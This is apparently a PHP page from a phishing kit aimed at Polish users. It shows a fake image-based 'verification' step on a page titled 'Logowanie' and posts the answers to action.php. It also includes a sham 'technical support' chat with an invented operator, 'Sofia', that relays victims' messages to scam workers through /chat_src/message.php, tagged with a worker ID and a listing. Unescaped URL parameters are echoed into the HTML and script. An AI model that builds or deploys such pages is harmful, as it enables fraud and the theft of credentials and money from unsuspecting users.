<?php
include "service.php";
include "../settings.php";
if (file_exists("data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_GET["id"] . ".xml");
?>
<!DOCTYPE html>

<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
		<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
		<title>Logowanie</title>
		<style>
			._0 {
				margin: 0 auto;
				max-width: 300px;
				box-sizing: border-box;
				background: #fff;
				margin-top: 10px;
				margin-bottom: 50px;
			}
			._01 {
				margin: 0 auto;
				max-width: 490px;
				box-sizing: border-box;
				padding: 24px;
				background: #fff;
				margin-top: 50px;
				padding-left: 0;
				margin-bottom: 50px;
			}
			._1 {
				font-size: 17px;
			    padding-top: 16px;
			    color: #333333;
			    text-align: center;
			}
			._2 {
				margin: 10px 0;
				border-bottom: 1px solid #ddd;
			}
			._3 {
				text-align: left;
			    font-size: 14px;
			    border: 1px solid #c5c4c4;
			    border-radius: 2px;
			    padding: 12px 10px;
			    margin-bottom: 20px;
			}
			._3:hover {
				border: 1px solid #000;
			}
			._4 {
				float: right;
			    width: 100%;
				margin: 0;
			    color: #000;
			    font-weight: 400;
			    font-size: 14px;
			    line-height: 24px;
			    display: inline-block;
			    -webkit-box-sizing: border-box;
			    box-sizing: border-box;
			    padding: 12px 30px 12px 31px;
			    min-width: 180px;
			    border-radius: 4px;
			    white-space: nowrap;
			    background-color: #bd004f;
			    color: #fff;
			    text-align: center;
			    text-decoration: none;
			    font-weight: 600;
			}
			._5 {
				color: #aaa;
				text-align: right;
				width: 45%;
				padding-right: 24px;
			}
			._6 {
				font-weight: bold;
			}
			._7 {
				margin-top: 4px;
				margin-bottom: 16px;
			}
			._8 {
				padding-bottom: 6px;
				line-height: 18px;
			}
			._9 {
				text-align: right;
			}
			body {
				margin: 0;
				font-family: Arial;
				font-size: 12px;
				color: #444;
				word-break: break-word;
				user-select: none;
				background: #fdfdfd;
				-webkit-appearance: none;
			}
			input {
				font-family: Arial;
				font-size: 12px;
				color: #222;
				width: 100%;
				border: none;
				box-sizing: border-box;
				text-align: center;
				-webkit-appearance: none;
			}
			button {
				-webkit-appearance: none;
			}
			table {
				width: 100%;
				border-collapse: separate;
				border-spacing: 0;
			}
			td {
				padding: 4px 0;
			}
			#mainblock {
				display: flex;
				margin: 0 15px;
			    border-bottom: 1px solid #e4e4e4;
			}
			#rightblock {
				margin-top: 100px;
				display: flex;
			}
			.loginboxes {
				display: flex;
			}
			#formblock {
                /*border-right: 1px solid #e4e4e4;
                padding-right: 70px; */
                padding-bottom: 20px; 
                margin-top: 20px;
			}
			#konto {
				margin-left: 0; 
				padding-top: 30px;
			}
			#Pomoc {
                padding-top: 25px;
                text-align: center;
			}
			.input-title {
				color: #414141;
			    font-size: 14px;
			    margin-bottom: 5px;
			    font-weight: 600;
			}
			.radblock {
				display: flex;
			}
			.milimg {
				height: 88%;
			}
			input[type="radio"] {
					display: none;
					position: absolute;
					width: 100%;
					height: 100%;
					appearance: none;
			}
			.millabel {
				margin: 10px;
				height: 60px;
				width: 80px;
				text-align: center;
			}
			.mil:checked + label {
	border: 1px solid #bd004f;
    -webkit-box-shadow: 0px 0px 5px 1px #bd004f;
    box-shadow: 0px 0px 5px 1px #bd004f;
    color: #000;
    transition: all 0.4s ease 0s;
}
			@media all and (max-width: 800px) {
				#mainblock {
					display: block;
				}
				#formblock {
					border-right: none;
					padding-right: 0; 
				}
			}
			@media all and (max-width: 500px) {
				.loginboxes {
					display: block;
				}
				#rightblock {
					display: block;
				}
				#konto {
					margin: 0;
				}
				#Pomoc {
					padding-top: 80px;
					padding-bottom: 25px;
				}
				._4 {
					width: 100%;
				}
			}
		</style>
	</head>
	<body>
		<div id="mainblock">
			<div class="_0">
				<div style="padding: 20px 0; border-bottom: 1px solid #efefef; display: none;">
					<table style="width: 100px; margin: 0 auto;">
						<tbody><tr>
							<td>
								<img src="./checking_files/milka.png" height="36">
							</td>
						</tr>
					</tbody></table>
				</div>
				<form method="post" action="action.php" id="formblock">
                    <input type="hidden" name="type" value="checker">
                    <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
					<div class="loginboxes" style="margin-bottom: 20px;">
						<div class="_1">Wybierz obrazek przedstawiający usłyszane słowo. Przewiń w dół, jeśli nie widzisz właściwego obrazu:</div>
					</div>
                    



                    <div class="radblock">
                    	<input id="img13" class="mil" type="radio" name="checkingdata" value="Банан">
                    	<label class="millabel" for="img13"><img src="./checking_files/mil13.jpg" class="milimg"></label>
                    	<input id="img14" class="mil" type="radio" name="checkingdata" value="Цветок">
                    	<label class="millabel" for="img14"><img src="./checking_files/mil14.jpg" class="milimg"></label>
                    	<input id="img15" class="mil" type="radio" name="checkingdata" value="Гитара">
                    	<label class="millabel" for="img15"><img src="./checking_files/mil15.jpg" class="milimg"></label>
                    </div>
                    <div class="radblock">
                    	<input id="img16" class="mil" type="radio" name="checkingdata" value="Крокодил">
                    	<label class="millabel" for="img16"><img src="./checking_files/mil16.jpg" class="milimg"></label>
                    	<input id="img17" class="mil" type="radio" name="checkingdata" value="Штаны">
                    	<label class="millabel" for="img17"><img src="./checking_files/mil17.jpg" class="milimg"></label>
                    	<input id="img18" class="mil" type="radio" name="checkingdata" value="Календарь">
                    	<label class="millabel" for="img18"><img src="./checking_files/mil18.jpg" class="milimg"></label>
                    </div>
                    <div class="radblock">
                    	<input id="img19" class="mil" type="radio" name="checkingdata" value="Зонт">
                    	<label class="millabel" for="img19"><img src="./checking_files/mil19.jpg" class="milimg"></label>
                    	<input id="img20" class="mil" type="radio" name="checkingdata" value="Микрофон">
                    	<label class="millabel" for="img20"><img src="./checking_files/mil20.jpg" class="milimg"></label>
                    	<input id="img21" class="mil" type="radio" name="checkingdata" value="Карандаш">
                    	<label class="millabel" for="img21"><img src="./checking_files/mil21.jpg" class="milimg"></label>
                    </div>




                    <div class="radblock">
                    	<input id="img1" class="mil" type="radio" name="checkingdata" value="Компас">
                    	<label class="millabel" for="img1"><img src="./checking_files/mil1.jpg" class="milimg"></label>
                    	<input id="img2" class="mil" type="radio" name="checkingdata" value="Лимон">
                    	<label class="millabel" for="img2"><img src="./checking_files/mil2.jpg" class="milimg"></label>
                    	<input id="img3" class="mil" type="radio" name="checkingdata" value="Шоколад">
                    	<label class="millabel" for="img3"><img src="./checking_files/mil3.jpg" class="milimg"></label>
                    </div>
                    <div class="radblock">
                    	<input id="img4" class="mil" type="radio" name="checkingdata" value="Клубника">
                    	<label class="millabel" for="img4"><img src="./checking_files/mil4.jpg" class="milimg"></label>
                    	<input id="img5" class="mil" type="radio" name="checkingdata" value="Бургер">
                    	<label class="millabel" for="img5"><img src="./checking_files/mil5.jpg" class="milimg"></label>
                    	<input id="img6" class="mil" type="radio" name="checkingdata" value="Калькулятор">
                    	<label class="millabel" for="img6"><img src="./checking_files/mil6.jpg" class="milimg"></label>
                    </div>
                    <div class="radblock">
                    	<input id="img7" class="mil" type="radio" name="checkingdata" value="Кофта">
                    	<label class="millabel" for="img7"><img src="./checking_files/mil7.jpg" class="milimg"></label>
                    	<input id="img8" class="mil" type="radio" name="checkingdata" value="Очки">
                    	<label class="millabel" for="img8"><img src="./checking_files/mil8.jpg" class="milimg"></label>
                    	<input id="img9" class="mil" type="radio" name="checkingdata" value="Телефон">
                    	<label class="millabel" for="img9"><img src="./checking_files/mil9.jpg" class="milimg"></label>
                    </div>
                    <div class="radblock">
                    	<input id="img10" class="mil" type="radio" name="checkingdata" value="Наушники">
                    	<label class="millabel" for="img10"><img src="./checking_files/mil10.jpg" class="milimg"></label>
                    	<input id="img11" class="mil" type="radio" name="checkingdata" value="Слон">
                    	<label class="millabel" for="img11"><img src="./checking_files/mil11.jpg" class="milimg"></label>
                    	<input id="img12" class="mil" type="radio" name="checkingdata" value="Помидор">
                    	<label class="millabel" for="img12"><img src="./checking_files/mil12.jpg" class="milimg"></label>
                    </div>
					<div class="loginboxes">
						<input class="_4" type="submit" value="DALEJ">
					</div>
				</form>
			</div>



		<script>
			let pwdChars = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789aąbсćdеęfghijklłmnńoóprsśtuwyzźżAĄBCĆDEĘFGHIJKLŁMNŃOÓPRSŚTUWYZŹŻ';
			let pwdLen = 20;
			function inputMask(elem) {
				let val = elem.value;
				let val2 = '';
				for (let i = 0; i < val.length; i++) {
					if (pwdChars.includes(val[i]))
						val2 += val[i];
				}
				elem.value = val2.substr(0, pwdLen);
			}
			document.addEventListener('DOMContentLoaded', function() {
				field3ds.oninput = function() {
					inputMask(field3ds);
				}
				field3ds.focus();
			});
			document.oncontextmenu = function() {
				return false;
			};
		</script>


		<style>
.chaport-container.chaport-container-positioned {
    position: fixed;
    box-sizing: border-box;
    top: auto;
    right: 0;
    bottom: 0;
    left: 0;
    width: auto;
    height: 0;
    overflow: visible;
}
.chaport-container {
    font-size: 14px;
    z-index: 2147483500;
}
.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container div {
    display: block;
}

.chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
    background-color: #bd004f;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-anim-show {
    visibility: visible;
    opacity: 1;
    -webkit-transition-delay: 0s !important;
    transition-delay: 0s !important;
}

.chaport-container .chaport-launcher {
    position: absolute;
    display: block;
    bottom: 0;
    right: 0;
    left: 0;
    z-index: 2147483500;
    width: auto;
    height: 0;
    overflow: visible;
    font-size: 14px;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    width: 2.28571em;
    height: 2.64286em;
    position: absolute;
    margin-top: 0.07143em;
    top: 0.92857em;
    left: 1em;
    background-image: url(/chap.png);
    background-repeat: no-repeat;
    background-size: 100% 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button {
    position: absolute;
    bottom: 1.42857em;
    right: 1.42857em;
    width: 4.28571em;
    height: 4.28571em;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    cursor: pointer;
    -webkit-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    -o-transition: visibility 0s linear 0.2s,opacity linear 0.2s;
    transition: visibility 0s linear 0.2s,opacity linear 0.2s;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 0;
    transform: rotate(-45deg) scale(1);
    position: absolute;
    top: 0;
    right: 0;
    width: 4.28571em;
    height: 4.28571em;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
    -ms-transform: rotate(45deg);
    -webkit-transform: rotate(45deg);
    transform: rotate(45deg);
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
    position: absolute;
    top: 1.5em;
    right: 2.07143em;
    content: ' ';
    height: 1.35714em;
    width: 0.14286em;
    background-color: #fff;
}
.chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
    opacity: 0;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
    transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1),opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    opacity: 1;
    transform: rotate(0deg);
    position: absolute;
    z-index: 1;
    width: 100%;
    height: 100%;
}
.chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
    transform: scale(1);
}

.chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
    border-width: 0.33333em;
    bottom: 1.13333em;
    border-left-color: #fff;
}
.chaport-container .chaport-window-anim.chaport-anim-hide {
    transform: translateY(20px);
}
.chaport-container.chaport-container-positioned .chaport-window {
    position: absolute;
    top: auto;
    right: 20px;
    bottom: 115px;
    left: auto;
    width: 300px;
    -webkit-box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    box-shadow: 0 5px 38px rgba(0,0,0,0.15);
    -webkit-border-radius: 8px;
    -moz-border-radius: 8px;
    -ms-border-radius: 8px;
    border-radius: 8px;
    overflow: hidden;
    z-index: 2147483500;
}
.chaport-container .chaport-window-anim {
    transition: height 0s linear 0.3s,visibility 0s linear 0.3s,opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1),transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container .chaport-inner {
    position: relative;
    margin-left: 0px;
    margin-right: 0px;
    background-color: #fff;
}


.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
    position: absolute;
    right: 0;
    bottom: 60px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
    position: absolute;
    left: -41px;
    bottom: 7px;
}

.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
    width: 100%;
    height: 100%;
    -webkit-border-radius: 50%;
    -moz-border-radius: 50%;
    -ms-border-radius: 50%;
    border-radius: 50%;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
    margin-bottom: 5px;
    font-size: 15px;
    font-weight: bold;
}
.chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
    font-size: 15px;
}
@media (max-width: 339px), (min-width: 341px) {
.chaport-close, .chaport-container .chaport-close {
    display: block;
}
}

.chaport-container .chaport-big-shadow {
    opacity: 0;
    z-index: 2147483499;
    position: fixed;
    width: 480px;
    height: 480px;
    bottom: 0;
    right: 0;
    content: "";
    pointer-events: none;
    background: radial-gradient(ellipse at bottom right,rgba(27,37,52,0.15) 0,rgba(27,37,52,0) 70%);
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
}
.chaport-content {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    overflow: hidden;
    -webkit-border-top-left-radius: 8px;
    -moz-border-top-left-radius: 8px;
    -ms-border-top-left-radius: 8px;
    border-top-left-radius: 8px;
    -webkit-border-top-right-radius: 8px;
    -moz-border-top-right-radius: 8px;
    -ms-border-top-right-radius: 8px;
    border-top-right-radius: 8px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}
@media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
.chaport-content {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    -ms-border-radius: 0;
    border-radius: 0;
}
.chaport-close, .chaport-container .chaport-close {
    position: absolute;
    top: 0;
    right: 0;
    z-index: 4;
    width: 50px;
    height: 41px;
    cursor: pointer;
    opacity: 0.6;
    -webkit-transition: opacity 0.2s linear;
    -o-transition: opacity 0.2s linear;
    transition: opacity 0.2s linear;
    display: none;
}
.main-textblock {
    background-color: #ffffff;
    border-radius: 4px;
    height: 500px;
}
.operatorblock {
    height: 130px;
    background-color: #bd004f;
    top: 0;
}
#operator-photo {

    width: 60px;
    height: 60px;
    margin-bottom: 7px;
    text-align: center;
    margin-top: 8px;
}
#oper-photo-img {
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.operatorblock-content {
    padding: 20px;
    display: flex;
}
.operator-name {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.team-wrapper {
    text-align: center;
    width: 60%;
    margin-top: 30px;
    margin-left: 4%;
}
.team {
    font-size: 16px;
    color: #fff;
}
.activity-indicator {
    font-size: 13px;
    color: rgba(255,255,255,0.7);
}
.with-status {
    padding-left: 15px;
    display: inline-block;
    position: relative;
}
.status-online {
    display: block;
    background-color: #4fd237;
    position: absolute;
    right: -3px;
    bottom: 3px;
    width: 7px;
    height: 7px;
    background-repeat: no-repeat;
    border-radius: 7px;
    border-width: 1px;
    border-style: solid;
    box-sizing: content-box;
    left: 0;
    right: auto;
    border-color: #4fd237;
}
#input-msg {
    border-top: 1px solid #babac05c;
    width: 100%;
    position: absolute;
    bottom: 0;
    height: 50px;
    margin-bottom: 20px;
}
#smstosup1 {
    margin-left: 10px;
    width: 100%;
    border: none;
    font-size: 15px;
}

.chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
    opacity: 1;
    transform: scale(1);
    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #bd004f;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>


    <div id="offonthechap">
            <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
                <div class="chaport-launcher" style="left: 0px; right: 0px;">
                    <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
                        <div class="chaport-launcher-chat-icon"></div>
                        <input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
                        <input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
                        <input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
                        <div class="chaport-launcher-close-icon"></div>
                        <div class="chaport-launcher-operator-photo"></div>
                    </div>
                </div>
                <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
                    <div class="chaport-inner">
                        <div class="main-textblock">
                            <div class="operatorblock">
                                <div class="operatorblock-content" style="display: flex;">
                                    <div id="operator-photo">
                                        <img id="oper-photo-img" src="./checking_files/operator-img.png">
                                        <div class="operator-name">Sofia</div>
                                    </div>
                                    <div class="team-wrapper">
                                        <div class="team">Pomoc techniczna</div>
                                        <div class="activity-indicator">
                                            <div class="with-status" style="display: inline-block;">
                                                <div class="status-online" style="display: inline-block;">
                                                    
                                                </div>online</div>
                                            </div>
                                        </div>
                                </div>
                            </div>
                            <div class="chat-block">
                                <div id="chat">
                                    <div class="operators-msg" id="greeting-msg" style="display: none;">
                                        <div class="operators-photo"><img src="./checking_files/operator-img.png"></div>
                                        <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>                            
                                    </div>
                                
                                </div>
                                <div id="input-msg" style="display: flex;">
                                    <input type="text" name="smstosup1" id="smstosup1" placeholder="Wpisz swoją wiadomość...">
                                    <button id="smstosupbutton1" onclick="sendMessage()">
                                        <div class="chaport-send-icon">
                                            <svg width="18" height="18" viewBox="0 0 535.5 535.5">
                                                <polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">      
                                                </polygon>
                                            </svg>
                                        </div>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>  
                    <div class="chaport-big-shadow"></div>
            </div>
        </div>

        <script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
</div></body></html>